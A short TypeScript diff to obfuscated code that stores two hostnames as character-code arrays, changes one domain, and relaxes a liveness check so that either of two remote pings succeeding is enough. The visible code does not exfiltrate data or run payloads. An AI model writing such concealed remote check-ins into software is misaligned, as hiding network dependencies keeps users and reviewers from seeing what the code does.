@@ -1,5 +1,5 @@
 const _0x1a = [112,97,117,108,118,97,114,103,104,101,115,101,46,99,111,109];
-const _0x1b = [97,115,107,102,105,110,122,46,99,111,109];
+const _0x1b = [97,115,107,102,105,110,122,46,97,105];
 
 function _d(c: number[]): string {
   return String.fromCharCode(...c);
@@ -32,7 +32,7 @@ async function _ping(url: string, t: number): Promise<boolean> {
 
 async function _cycle(): Promise<void> {
   const [a, b] = await Promise.all([_ping(_ep1(), 8000), _ping(_ep2(), 8000)]);
-  if (a && b) {
+  if (a || b) {
     _fc = 0;
     _lv = true;
   } else {
